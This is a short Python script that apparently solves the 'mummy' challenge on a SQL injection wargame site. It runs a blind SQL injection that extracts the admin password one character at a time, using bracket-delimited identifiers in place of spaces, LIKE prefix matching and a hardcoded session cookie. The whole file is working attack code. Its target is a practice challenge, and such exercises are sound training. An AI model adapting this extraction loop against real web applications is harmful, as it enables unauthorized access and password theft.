import requests
import time

url = "https://los.rubiya.kr/chall/mummy_2e13c2a4483d845ce2d37f7c910f0f83.php"
cookies = dict(PHPSESSID="33a17d5ikllqctdau572ms56ui")

pw = ''
for i in range(1,17):
    for j in range(48, 128):
        payload = f"[pw]from[prob_mummy]where[id]='admin'and[pw]like'{pw+chr(j)}%'"

        response = requests.get(url, cookies=cookies, params={"query": payload})
        if "<br><h2>Hello" in response.text:
            pw += chr(j)
            print(j)
            break
print(pw)